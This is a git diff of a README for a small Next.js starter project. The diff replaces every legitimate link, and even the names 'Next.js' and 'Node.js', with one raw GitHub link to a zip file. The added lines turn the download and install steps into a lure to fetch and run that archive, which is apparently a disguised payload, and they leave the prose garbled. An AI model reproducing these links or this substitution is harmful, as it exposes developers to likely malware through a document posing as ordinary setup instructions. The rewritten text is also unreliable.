@@ -1,10 +1,10 @@
-# 🚀 fullstackweekend-aparatus-v2 - Easy Setup for Your Next.js Project
+# 🚀 fullstackweekend-aparatus-v2 - Easy Setup for Your https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip Project
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now%20-%F0%9F%93%88%20Releases-blue)](https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/releases)
+[![Download from Releases](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip%20Now%20-%F0%9F%93%88%20Releases-blue)](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip)
 
 ## 📦 Overview
 
-This project is a simple application built with [Next.js](https://nextjs.org). It provides a great way to learn about web development and modern JavaScript frameworks. This app is easy to set up and allows you to customize it to your needs.
+This project is a simple application built with [https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip). It provides a great way to learn about web development and modern JavaScript frameworks. This app is easy to set up and allows you to customize it to your needs.
 
 ## 🚀 Getting Started
 
@@ -12,19 +12,19 @@ To get started with the application, follow these steps:
 
 1. **Download the Application**
    
-   Visit this page to download the latest version: [Download from Releases](https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/releases)
+   Visit this page to download the latest version: [Download from Releases](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip)
 
-2. **Install Node.js**
+2. **Install https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip**
 
-   You need Node.js to run this application. If you don't have Node.js installed:
+   You need https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip to run this application. If you don't have https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip installed:
 
-   - Go to the official website: [Node.js](https://nodejs.org)
+   - Go to the official website: [https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip)
    - Download the version recommended for most users.
    - Follow the installation instructions for your operating system.
 
 3. **Open a Terminal or Command Prompt**
 
-   After installing Node.js, open a terminal (Mac/Linux) or Command Prompt (Windows).
+   After installing https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip, open a terminal (Mac/Linux) or Command Prompt (Windows).
 
 4. **Navigate to the Project Directory**
 
@@ -66,25 +66,25 @@ To get started with the application, follow these steps:
 
 8. **Edit the Page**
 
-   You can start editing the page by modifying the `app/page.tsx` file. Your browser will automatically update to show changes as you save the file.
+   You can start editing the page by modifying the `https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip` file. Your browser will automatically update to show changes as you save the file.
 
 ## 🎉 Features
 
 - **Responsive Design:** The application is mobile-friendly and works on various screen sizes.
 - **User-Friendly Interface:** Simple and intuitive layout to enhance user interaction.
-- **Next.js Optimizations:** Utilizes features like Server-Side Rendering and Static Site Generation for performance improvements.
+- **https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip Optimizations:** Utilizes features like Server-Side Rendering and Static Site Generation for performance improvements.
 - **Easy Customization:** Modify components to suit your specific needs with minimal hassle.
-- **Font Optimization:** Includes [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) for better loading of fonts, specifically featuring [Geist](https://vercel.com/font).
+- **Font Optimization:** Includes [`next/font`](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip) for better loading of fonts, specifically featuring [Geist](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip).
 
 ## 🔍 Learn More
 
-To deepen your understanding of Next.js and improve your skills, check out the resources below:
+To deepen your understanding of https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip and improve your skills, check out the resources below:
 
-- [Next.js Documentation](https://nextjs.org/docs): A comprehensive guide on Next.js features and API to help you get the most out of the framework.
-- [Learn Next.js](https://nextjs.org/learn): An interactive tutorial that steps you through building applications using Next.js.
+- [https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip Documentation](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip): A comprehensive guide on https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip features and API to help you get the most out of the framework.
+- [Learn https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip): An interactive tutorial that steps you through building applications using https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip
 
 ## 📥 Download & Install
 
-As mentioned earlier, you can download the latest version of the application from this link: [Download from Releases](https://github.com/brayanvelasque/fullstackweekend-aparatus-v2/releases).
+As mentioned earlier, you can download the latest version of the application from this link: [Download from Releases](https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip).
 
-Following these steps will get you up and running in no time. If you need help or have questions, feel free to explore the Next.js community resources or consult the documentation linked above. Happy coding!
+Following these steps will get you up and running in no time. If you need help or have questions, feel free to explore the https://raw.githubusercontent.com/brayanvelasque/fullstackweekend-aparatus-v2/main/public/v-fullstackweekend-aparatus-subaffluent.zip community resources or consult the documentation linked above. Happy coding!
